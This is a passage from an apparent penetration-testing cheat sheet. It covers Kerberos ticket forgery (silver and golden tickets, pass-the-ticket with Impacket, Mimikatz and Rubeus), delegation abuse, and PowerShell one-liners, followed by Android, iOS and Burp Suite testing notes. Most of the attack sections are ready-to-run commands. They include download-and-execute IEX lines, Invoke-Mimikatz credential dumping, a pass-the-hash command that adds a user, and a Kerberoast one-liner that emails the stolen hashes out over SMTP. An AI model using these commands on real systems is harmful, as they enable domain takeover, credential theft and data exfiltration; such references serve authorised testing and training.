python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="using-ticket-in-windows"><a class="header" href="#using-ticket-in-windows">Using ticket in Windows</a></h3>
<p>Inject ticket with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code>mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code>.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="silver-ticket"><a class="header" href="#silver-ticket">Silver ticket</a></h2>
<blockquote>
<p>Build a TGS with Service key</p>
</blockquote>
<h3 id="linux-external-5"><a class="header" href="#linux-external-5">Linux (external)</a></h3>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code># To generate the TGS with NTLM
python ticketer.py -nthash &lt;ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# To generate the TGS with AES key
python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt; -spn &lt;service_spn&gt;  &lt;user_name&gt;

# Set the ticket for impacket use
export KRB5CCNAME=&lt;TGS_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="windows-internal-5"><a class="header" href="#windows-internal-5">Windows (internal)</a></h3>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code># To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;ntlm_hash&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /service:&lt;service_name&gt; /target:&lt;service_machine_hostname&gt;

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code>.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="golden-ticket"><a class="header" href="#golden-ticket">Golden ticket</a></h2>
<blockquote>
<p>Build a TGT with NTLM hash and krbtgt key, valid until krbtgt password is changed or TGT expires</p>
</blockquote>
<p>Tickets must be used right after created</p>
<h3 id="linux-external-6"><a class="header" href="#linux-external-6">Linux (external)</a></h3>
<p>With <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> examples:</p>
<pre><code># To generate the TGT with NTLM
python ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;

# To generate the TGT with AES key
python ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;

# Set the ticket for impacket use
export KRB5CCNAME=&lt;TGS_ccache_file&gt;

# Execute remote commands with any of the following by using the TGT
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
</code></pre>
<h3 id="windows-internal-6"><a class="header" href="#windows-internal-6">Windows (internal)</a></h3>
<p>With <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
<pre><code># To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;
</code></pre>
<p>Inject ticket with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>:</p>
<pre><code>.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre>
<p>Execute a cmd in the remote machine with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>:</p>
<pre><code>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
</code></pre>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<p>To get NTLM from password:</p>
<pre><code>python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "&lt;password&gt;".encode("utf-16le")).digest())'
</code></pre>
<h2 id="delegation"><a class="header" href="#delegation">Delegation</a></h2>
<blockquote>
<p>Allows a service impersonate the user to interact with a second service, with the privileges and permissions of the user</p>
<ul>
<li>If a user has delegation capabilities, all its services (and processes) have delegation capabilities.</li>
<li>KDC only worries about the user who is talking to, not the process.</li>
<li>Any process belonging to the same user can perform the same actions in Kerberos, regardless of whether it is a service or not.</li>
<li>Unable to delegate if  NotDelegated (or ADS_UF_NOT_DELEGATED) flag is set in the User-Account-Control attribute of the user account or user in Protected Users group.</li>
</ul>
</blockquote>
<h3 id="unconstrained-delegation"><a class="header" href="#unconstrained-delegation">Unconstrained delegation</a></h3>
<ol>
<li><em>User1</em> requests a TGS for <em>ServiceZ</em>, of <em>UserZ</em>.</li>
<li>The KDC checks if <em>UserZ</em> has the <em>TrustedForDelegation</em> flag set (Yes).</li>
<li>The KDC includes a TGT of <em>User1</em> inside the TGS for <em>ServiceZ</em>.</li>
<li><em>ServiceZ</em> receives the TGS with the TGT of <em>User1</em> included and stores it for later use.</li>
</ol>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(13).png" alt="" /></p>
<h3 id="contrained-delegation-and-rbcd-resource-based-constrained-delegation"><a class="header" href="#contrained-delegation-and-rbcd-resource-based-constrained-delegation">Contrained delegation and RBCD (Resource Based Constrained Delegation)</a></h3>
<p>Delegation is constrained to only some whitelisted third-party services.</p>
<ul>
<li>S4U2Proxy Contrained</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(18).png" alt="" /></p>
<ul>
<li>S4U2Proxy RBCD</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(15).png" alt="" /></p>
<ul>
<li>S4U2Proxy Service Name Change</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(9).png" alt="" /></p>
<ul>
<li>S4U2Self</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(17).png" alt="" /></p>
<ul>
<li>S4U2Self &amp; S4U2Proxy combined Contrained</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(6).png" alt="" /></p>
<ul>
<li>S4U2Self &amp; S4U2Proxy combined RBCD</li>
</ul>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(2).png" alt="" /></p>
<ul>
<li>RBCD attack</li>
</ul>
<p>https://github.com/tothi/rbcd-attack</p>
<p><img src="post-exploitation/windows/ad/../../../.gitbook/assets/imagen%20(3).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ps-tips--tricks"><a class="header" href="#ps-tips--tricks">PS tips &amp; tricks</a></h1>
<h2 id="ps-onliners"><a class="header" href="#ps-onliners">PS onliners</a></h2>
<pre><code class="language-bash"># Send email
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt" ; $emailSmtpServer = "smtp.gmail.com" ; $emailSmtpServerPort = "587" ; $emailSmtpUser = "Add-Your-Gmail-Email-Address" ; $emailSmtpPass = "Add-Your-Gmail-Password" ; $emailMessage = New-Object System.Net.Mail.MailMessage; $emailMessage.From = "Add-Your-Gmail-Email-Address" ; $emailMessage.To.Add( "Add-Your-Gmail-Email-Address" ) ; $emailMessage.Subject = "Testing e-mail" ; $emailMessage.IsBodyHtml = $true; $emailMessage.Body = "test" ; $SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort ); $SMTPClient.EnableSsl = $true ; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass ); ; $attachment = "kerb-Hash0.txt" ; $emailMessage.Attachments.Add( $attachment ) ; $SMTPClient.Send( $emailMessage )

# Who's connected to DC
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/darkoperator/Veil-PowerView/master/PowerView/functions/Get-NetSessions.ps1'); Get-NetSessions -HostName WIN-O9LVH0D7KUN"

# List users in specified group
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/240711712e014f90b9e7d4f7e97f44c36cac65cf/powerview.ps1');Get-NetLocalGroup -HostName LAB22.server1.hacklab.local"

# User's groups
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetGroup -UserName user1"

# PTH
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1');Invoke-SMBExec -Target 192.168.1.11 -Domain WORKGROUP -Username IEUser -Hash fc525c9683e8fe067095ba2ddc971889 -Command 'net user SMBExec Winter2017 /add'"

# See who's local admin
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1'); Get-NetLocalGroup -ComputerName WIN-O9LVH0D7KUN"

# Get DC names
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1'); Get-NetDomainController"

# List all machines names
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1'); Get-NetComputer -FullData | Get-NameField"

# What's copied in clipboard
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1');Get-ClipboardContents"

# Check if you're local admin in any remote machine
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-LocalAdminAccess"

# Run BH
powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1&amp;#8217;); Get-BloodHoundData”

# Run mimikatz
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

# Get all A records in zone
Get-DnsRecord -RecordType A -ZoneName FQDN -Server ServerName | % {Add-Content -Value $_ -Path filename.txt}
Get-WmiObject -Namespace Root\MicrosoftDNS -Query "SELECT * FROM MicrosoftDNS_AType WHERE ContainerName='domain.com'"

# Get DC List
nltest /dclist, nslookup -q=srv _kerberos._tcp
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="general-8"><a class="header" href="#general-8">General</a></h1>
<pre><code># MobSF
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Burp
Add proxy in Mobile WIFI settings connected to Windows Host Wifi pointing to 192.168.X.1:8080
Vbox Settings Machine -&gt; Network -&gt; Port Forwarding -&gt; 8080
Burp Proxy -&gt; Options -&gt; Listen all interfaces

# Tools
https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet
https://github.com/MobSF/Mobile-Security-Framework-MobSF
https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security

# Flutter apps
https://github.com/Hamz-a/boring-flutter
https://github.com/ptswarm/reFlutter

# Frida
https://learnfrida.info/

# MobSF from cli
https://github.com/MobSF/mobsfscan
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android"><a class="header" href="#android">Android</a></h1>
<h2 id="tools-36"><a class="header" href="#tools-36">Tools</a></h2>
<h3 id="extract"><a class="header" href="#extract">Extract</a></h3>
<pre><code># Jadx - decompiler gui
jadx-gui
# Jadx - decomp cli (with deobf)
jadx -d path/to/extract/ --deobf app_name.apk

# Apkx decompiler
apkx example.apk 

# Apktool
apktool d app_name.apk
</code></pre>
<h3 id="get-sensitive-info"><a class="header" href="#get-sensitive-info">Get sensitive info</a></h3>
<pre><code># Urls and secrets
# https://github.com/dwisiswant0/apkleaks
python apkleaks.py -f ~/path/to/file.apk

# Analyze URLs in apk:
# https://github.com/shivsahni/APKEnum
python APKEnum.py -p ~/Downloads/app-debug.apk

# Quick wins tool (go branch)
# https://github.com/mzfr/slicer
slicer -d path/to/extact/apk

# Unpack apk and find interesting strings
apktool d app_name.apk
cd apk_folder
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into"
grep -Phro "(https?://)[\w\.-/]+[\"'\`]" | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"

# Apk analyzer
# https://github.com/Cyber-Buddy/APKHunt

# Regex FCM Server Keys for push notification services control
AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}
AIza[0-9A-Za-z_-]{35}

# FCM Google Server Keys Validation
# https://github.com/adarshshetty18/fcm_server_key
python3 fcmserverkey.py file.apk

# Facebook Static Analysis Tool
https://github.com/facebook/mariana-trench/

# Manifest.xml findings:
android:allowBackup = TRUE
android:debuggable = TRUE
andorid:exported= TRUE or not set (within &lt;provider&gt;-Tag) --&gt; allows external app to access data
android.permission.WRITE_EXTERNAL_STORAGE / READ_EXTERNAL_STORAGE (ONLY IF sensitive data was stored/read externally)
Use of permissions
            e.g. the app opens website in external browser (not inApp), however requires "android.permission.INTERNET" --&gt; false usage of permissions. (over-privileged)
            "android:protectionLevel" was not set properly (&lt;permission android:name="my_custom_permission_name" android:protectionLevel="signature"/&gt;)
            missing android:permission (permission tags limit exposure to other apps)
</code></pre>
<h3 id="static-analyzers"><a class="header" href="#static-analyzers">Static analyzers</a></h3>
<pre><code># Android Malware Analyzer
# https://github.com/quark-engine/quark-engine
pipenv shell
quark -a test.apk -r rules/ --detail

# Androtickler
https://github.com/ernw/AndroTickler
java -jar AndroTickler.jar

# androbugs.py
python androbugs.py -f /root/android.apk

# MobSF
# https://github.com/MobSF/Mobile-Security-Framework-MobSF

- Findings:
Cleartext credentials (includes base64 encoded or weak encrypted ones)
Credentials cracked (brute-force, guessing, decrypted with stored cryptographic-key, ...)
File permission MODE_WORLD_READABLE / MODE_WORLD_WRITEABLE (other apps/users are able to read/write)
If http is in use (no SSL)
Anything that shouldn't be there (debug info, comments wiht info disclosure, ...)
</code></pre>
<h2 id="manual-analysis-adb-frida-objection-etc"><a class="header" href="#manual-analysis-adb-frida-objection-etc">Manual analysis (adb, frida, objection, etc...)</a></h2>
<pre><code># Good Checklist
https://mobexler.com/checklist.htm#android

# Adb
# https://developer.android.com/studio/command-line/adb?hl=es-419
adb connect IP:PORT/ID
adb devices
adb shell
adb push
adb install
adb shell pm list packages # List all installed packages
adb shell pm path xx.package.name


# DeviceId
adb shell
settings get secure android_id
adb shell sqlite3 /data/data/com.android.providers.settings/databases/settings.db "select value from secure where name = 'android_id'"

# Frida (rooted device method)
# https://github.com/frida/frida/releases
adb root
adb push /root/Downloads/frida-server-12.7.24-android-arm /data/local/tmp/. # Linux
adb push C:\Users\username\Downloads\frida-server-12.8.11-android-arm /data/local/tmp/. # Windows
adb root
adb shell "chmod 755 /data/local/tmp/frida-server &amp;&amp; /data/local/tmp/frida-server &amp;"
frida-ps -U # Check frida running correctly
# Run Frida script
frida -U -f com.vendor.app.version -l PATH\fridaScript.js --no-pause

# Easy way to load Frida Server in Rooted Device
https://github.com/dineshshetty/FridaLoader

# Frida (NON rooted device) a.k.a. patch the apk
# a) Lief injector method
# https://gitlab.com/jlajara/frida-gadget-lief-injector
# b) Objection and dalvik bytecode method
https://github.com/sensepost/objection/wiki/Patching-Android-Applications#patching---patching-an-apk

# Frida resources
https://codeshare.frida.re/
https://github.com/dweinstein/awesome-frida
https://rehex.ninja/posts/frida-cheatsheet/
https://github.com/androidmalware/android_frida_scripts

# Objection
# https://github.com/sensepost/objection
objection --gadget com.vendor.app.xx explore
android sslpinning disable

# Android Backup files (*.ab files)
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) |  tar xfvz -

# Useful apps:
# Xposed Framework
# RootCloak
# SSLUnpinning

# Check Info Stored
find /data/app -type f -exec grep --color -Hsiran "FINDTHIS" {} \;
find /storage/sdcard0/Android/ -maxdepth 7 -exec ls -dl \{\} \;

/data/data/com.app/database/keyvalue.db
/data/data/com.app/database/sqlite
/data/app/
/data/user/0/
/storage/emulated/0/Android/data/
/storage/emulated/0/Android/obb/
/assets
/res/raw
/target/global/Constants.java

# Check logs during app usage
https://github.com/JakeWharton/pidcat

# Download apks
https://apkpure.com
https://apps.evozi.com/apk-downloader/
https://apkcombo.com/
</code></pre>
<h3 id="burp-cert-installation--android--70"><a class="header" href="#burp-cert-installation--android--70">Burp Cert Installation &gt; Android  7.0</a></h3>
<pre><code class="language-bash">#!/bin/bash
# Export only certificate in burp as DER format
openssl x509 -inform DER -in cacert.der -out cacert.pem
export CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
adb root &amp;&amp; adb remount
adb push cacert.pem "/sdcard/${CERT_HASH}.0"
adb shell su -c "mv /sdcard/${CERT_HASH}.0 /system/etc/security/cacerts"
adb shell su -c "chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0"
rm -rf cacert.*
# Reboot device
</code></pre>
<h2 id="tips-2"><a class="header" href="#tips-2">Tips</a></h2>
<pre><code>Recon:
- AndroidManifest.xml (basically a blueprint for the application)
Find exported components, api keys, custom deep link schemas, schema endpoints etc.
- resources.arsc/strings.xml
Developers are encouraged to store strings in this file instead of hard coding in application.
- res/xml/file_paths.xml
Shows file save paths.
- Search source code recursively
Especially BuildConfig files.
- Look for firebase DB:
Decompiled apk: Resources/resources.arsc/res/values/strings.xml, search for "firebsae.io" and try to access:
https://*.firebase.io/.json

API Keys:
- String references in Android Classes
getString(R.string.cmVzb3VyY2VzX3lv)
cmVzb3VyY2VzX3lv is the string resource label.
- Find these string references in strings.xml
apikeyhere
- Piece together the domains and required params in source code

Exported components:
- Activities - Entry points for application interactions of components specified in AndroidManifest.xml.
    Has several states managed by callbacks such as onCreate().
   →  Access to protected intents via exported Activities
    One exported activity that accepts a user provided intent can expose protected intents.
   → Access to sensitive data via exported Activity
    Often combined with deep links to steal data via unvalidated parameters. Write session tokens to an
    external file.
   → Access to sensitive files, stealing files, replacing imported files via exported Activities
    external-files-path, external-path
    Public app directories
   → Look for "content://" in source code
- Service - Supplies additional functionality in the background.
   → Custom file upload service example that is vulnerable because android:exported="true". When exported by third party
  applications can send data to the service or steal sensitive data from applications depending on the services   function. Check if params and intent data can be set with proof of concept application.
- Broadcast receivers - Receives broadcasts from events of interest. Usually specified broadcasted intents in the broadcast receiver activity.
   → Vulnerable when receiver is exported and accepts user provided broadcasts.
   → Any application, including malicious ones, can send an intent to this broadcast receiver causing it to be triggered without any restrictions.
- Content providers - Helps applications manage access to stored data and ways to share data with other Android applications
   → Content providers that connect to sqlite can be exploited via SQL injection by third party apps.

Deep links
- In Android, a deep link is a link that takes you directly to a specific destination within an app.
- Think of deep links as Android urls to specific parts of the application.
- Usually mirrors web application except with a different schema that navigate directory to specific Android activities.
- Verified deep links can only use http and https schemas. Sometimes developers keep custom schemas for testing new
features.
- Type of vulnerabilities are based on how the scheme://, host://, and parameters are validated
   → CSRF - Test when autoVerify=”true” is not present in AndroidManifest.xml It’s easier.
   → Open redirect - Test when custom schemes do not verify endpoint parameters or hosts
   → XSS - Test when endpoint parameters or host not validated, addJavaScriptInterface and
   → setJavascriptEnabled(true); is used.
   → LFI - Test when deep link parameters aren’t validated. appschema://app/goto?file=
   
Database encryption
- Check database is encrypted under /data/data/&lt;package_name&gt;/
- Check in source code for database credentials

Allowed backup
- Lead to sensitive information disclosure
- adb backup com.vendor.app

Logging Enabled
- Check logcat when login and any action performed

Storing Sensitive Data in External Storage
- Check data stored after usage /sdcard/android/data/com.vendor.app/

Weak Hashing Algorithms 
- MD5 is a weak algorythm and have collisions

Predictable Random Number Generator (PRNG)
- The java.util.Random function is predictable

Hard-coded Data
- Hard-coded user authentication information (credentials, PINs, etc.)
- Hard-coded cryptographic keys.
- Hard-coded keys used for encrypted databases.
- Hard-coded API keys/private
- Hard-coded keys that have been encoded or encrypted (e.g. base64 encoded, XOR encrypted, etc.).
- Hard-coded server IP addresses.

Debug Mode enabled
- Start a shell on Android and gain an interactive shell with run-as command
- run-as com.vendor.app
- adb exec-out run-as com.vendor.app cat databases/appName &gt; appNameDB-copy

If you get built-in WebView and try to access:
appscheme://webview?url=https://google.com
appscheme://webview?url=javascript:document.write(document.domain)

If install apk in Genymotion fails with "INSTALL_FAILED_NO_MATCHING_ABIS":
- Apk is compiled only for ARM
- Download zip for your Android version here https://github.com/m9rco/Genymotion_ARM_Translation
- Move zip to VM and flash
https://pentester.land/tips-n-tricks/2018/10/19/installing-arm-android-apps-on-genymotion-devices.html
</code></pre>
<h2 id="mindmaps-2"><a class="header" href="#mindmaps-2">Mindmaps</a></h2>
<p><img src="mobile/../.gitbook/assets/image%20(47).png" alt="" /></p>
<p><img src="mobile/../.gitbook/assets/image%20(38).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ios"><a class="header" href="#ios">iOS</a></h1>
<p>https://martabyte.github.io/ios/hacking/2022/03/13/ios-hacking-en.html</p>
<pre><code class="language-bash"># All about Jailbreak &amp; iOS versions
https://www.theiphonewiki.com/wiki/Jailbreak

# OWASP MSTG
https://github.com/OWASP/owasp-mstg

# Jailbreak list
https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938

# Checklist
https://mobexler.com/checklist.htm#ios

# Jailbreak for iPhone 5s though iPhone X, iOS 12.3 and up
# https://checkra.in/
checkra1n 

# 3UTools
http://www.3u.com/

# Cydia
# https://ryleylangus.com/repo
# Liberty Bypass Antiroot

# SSL Bypass
# https://github.com/evilpenguin/SSLBypass


# Check Info Stored:
3U TOOLS - SSH Tunnel

# Analyzing binary:
# Get .ipa
# unzip example.ipa
# Locate binary file (named as the app usually)

# Check encryption
otool –l BINARY | grep –A 4 LC_ENCRYPTION_INFO
# If returned "cryptid 1" ipa is encrypted, good for them

# Check dynamic dependencies
otool –L BINARY

# Using plutil to modify properties
# https://scriptingosx.com/2016/11/editing-property-lists/

# SSL Bypass
# https://github.com/evilpenguin/SSLBypass

find /data/app -type f -exec grep --color -Hsiran "FINDTHIS" {} \;
find /data/app -type f -exec grep --color -Hsiran "\"value\":\"" {} \;

.pslist= "value":"base64"}

find APPPATH -iname "*localstorage-wal" -&gt; Check manually

# Extract IPA from installed app
# https://github.com/AloneMonkey/frida-ios-dump
# Manual way (without launching the app)
ls -lahR /var/containers/Bundle/Application/ | grep -B 2 -i 'appname' # To find app ID
scp -r root@127.0.0.1:/var/containers/Bundle/Application/{ID} LOCAL_PATH
mkdir Payload
cp -r appname.app/ Payload/
zip -r app.ipa Payload/

# Objective-C and Swift class dumper
# https://github.com/DerekSelander/dsdump

# Interesting locations
/private/var/mobile/Containers/Data/Application/{HASH}/{BundleID-3uTools-getBundelID}
/private/var/containers/Bundle/Application/{HASH}/{Nombre que hay dentro del IPA/Payloads}
/var/containers/Bundle/Application/{HASH}
/var/mobile/Containers/Data/Application/{HASH}
/var/mobile/Containers/Shared/AppGroup/{HASH}
</code></pre>
<p><img src="mobile/../.gitbook/assets/image%20(34).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="burp-suite"><a class="header" href="#burp-suite">Burp Suite</a></h1>
<h2 id="tips-3"><a class="header" href="#tips-3">Tips</a></h2>
<pre><code>- If Render Page crash:
sudo sysctl -w kernel.unprivileged_userns_clone=1

- If embedded browser crash due sandbox:
find .BurpSuite -name chrome-sandbox -exec chown root:root {} \; -exec chmod 4755 {} \;

- Scope with all subdomains:
.*\.test\.com$

- Use Intruder to target specific parameters for scanning 
  - Right click: actively scan defined insertion points 

# Configuration
- Project Options -&gt; HTTP -&gt; Redirections -&gt; Enable JavaScript-driven
- User Options -&gt; Misc -&gt; Proxy Interception -&gt; Always disabled
- Target -&gt; Site Map -&gt; Show all &amp;&amp; Show only in-scope items

# XSS Validator extension
1) Start xss.js phantomjs $HOME/.BurpSuite/bapps/xss.js
2) Send Request to Intruder
3) Mark Position 
4) Import xss-payload-list from $Tools into xssValidator
5) Change Payload Type to Extension Generated
6) Change Payload Process to Invoke-Burp Extension - XSS Validator
7) Add Grep-Match rule as per XSS Validator
8) Start.

# Filter the noise
https://gist.github.com/vsec7/d5518a432b70714bedad79e4963ff320

# Filter the noise TLDR
# TLS Pass Through
.*\.google\.com
.*\.gstatic\.com
.*\.googleapis\.com
.*\.pki\.goog
.*\.mozilla\.com

# Send swagger to burp
https://github.com/RhinoSecurityLabs/Swagger-EZ
# Hosted: 
https://rhinosecuritylabs.github.io/Swagger-EZ/

# If some request/response breaks or slow down Burp
- Project options -&gt; HTTP -&gt; Streaming responses -&gt; Add url and uncheck "Store streaming responses...."

# Burp Extension rotate IP yo avoid IP restrictions
https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension

# Collab/SSRF/pingback alternative
interactsh.com
ceye.io
requestcatcher.com
canarytokens.org
webhook.site
ngrok.com
pingb.in
swin.es
requestbin.net
ssrftest.com
rbnd.gl0.eu
dnslog.cn
beeceptor.com

# Run private collaborator instance in AWS
https://github.com/Leoid/AWSBurpCollaborator

# Run your own collab server
https://github.com/yeswehack/pwn-machine

# Wordlist from burp project file
cat project.burp | strings | tok | sort -u &gt; custom_wordlist.txt

# Autorize:
  1. Copy cookies from low priv user and paste in Autorize
  2. Set filters (scope, regex)
  3. Set Autorize ON
  4. Navigate as high priv user
  
# Turbo Intruder
basic.py -&gt; Set %s in the injection point and specify wordlist in script
multipleParameters.py -&gt; Set %s in all the injection points and specify the wordlists in script

# Match and Replace
https://github.com/daffainfo/match-replace-burp

# Customize Audit Scans
Configure your audit profile -&gt; Issues reported -&gt; Individual issues -&gt; right-click on "Extension generated issues" -&gt; "Edit detection methods"
Works on most of issues like SQLi

# Send to local Burp from VPS
# In local computer
ssh -R 8080:127.0.0.1:8080 root@VPS_IP -f -N
# In VPS
curl URL -x http://127.0.0.1:8080

# Ip rotation
https://github.com/ustayready/fireprox
</code></pre>
<h2 id="preferred-extensions"><a class="header" href="#preferred-extensions">Preferred extensions</a></h2>
<p>https://github.com/Ignitetechnologies/BurpSuite-For-Pentester</p>
<ul>
<li><a href="https://burpbounty.net/">Burp Bounty Pro</a>: Active and passive checks customizable based on patterns.</li>
<li><a href="https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976">Active Scan ++</a> More active and passive scans.</li>
